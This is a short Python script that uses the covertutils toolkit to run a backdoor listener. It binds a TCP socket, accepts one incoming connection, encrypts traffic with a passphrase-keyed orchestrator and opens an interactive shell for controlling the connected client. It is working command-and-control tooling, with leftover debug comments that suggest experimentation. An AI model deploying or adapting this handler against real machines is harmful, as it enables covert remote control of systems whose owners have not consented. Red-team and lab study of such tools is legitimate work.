#!/usr/bin/env python
from covertutils.shells.impl import ExtendableShell
from covertutils.handlers import BaseHandler
from covertutils.orchestration import SimpleOrchestrator



import sys
import socket
from time import sleep

try :
	program, port, passphrase = sys.argv
except :
	print(( """Usage:
	%s <port> <passphrase>""" % sys.argv[0] ))
	sys.exit(1)

addr = '0.0.0.0', int(port)

orch = SimpleOrchestrator( passphrase, tag_length = 2, out_length = 50, in_length = 50 )

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	#AF INET param is (host, port). This is for ipv4 protocol. 
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind( addr )		# Handling Networking
s.listen(5)		# independently of covertutils

print( "Accepting" )
client, client_addr = s.accept()		# Blocking the main thread
print("Client is:")
print(client)
print("Client address is: ")
print(client_addr)
print( "Accepted" )

def recv () :		# Create wrappers for networking
	#print("In listener, this is the return value of recv(): %s" % client.recv(50))
	#return client.recv(50)
	global closed
	try :
		ret = client.recv(50)
		#print("Ret in listener is: %s" % ret)
		if ret == '' :	  # in empty string socket is closed
			closed = True
			s.close()
	except :
		closed = True
		print("Connection error caught")
		return ''
		# print( "Connection Terminated" )
		# ret = 'X'
	return ret

def send( raw ) :		# Create wrappers for networking
	#print("In listener, the thing being sent is: %s" % raw)
	return client.send( raw )


class MyHandler( BaseHandler ) :

	def onChunk( self, stream, message ) :
		#print("In onChunk in listener")
		pass

	def onMessage( self, stream, message ) :
		#print ("In on message")
		#print( message )
		pass

	def onNotRecognised( self ) :
		print( "Got Garbage!" )
		global s
		s.close()

handler = MyHandler( recv, send, orch )
shell = ExtendableShell(handler, prompt = "(%s:%d)> " % client_addr, debug = True )

shell.start()
